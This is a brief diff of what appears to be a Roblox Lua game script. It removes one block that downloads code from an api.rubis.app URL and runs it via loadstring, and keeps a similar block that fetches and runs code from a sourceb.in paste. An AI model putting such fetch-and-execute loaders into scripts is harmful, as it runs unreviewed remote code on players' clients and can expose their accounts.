@@ -5,10 +5,6 @@ task.spawn(function()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6pbc4nSNzI/0"))()
 end)
 
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/zvkJyvPyFfWSg4bX/raw"))()
-end)
-
 -- ============================================================
 -- 1. ПРИВЕТСТВИЕ И ЧЁРНЫЙ ФОН (Mertily's script)
 -- ============================================================
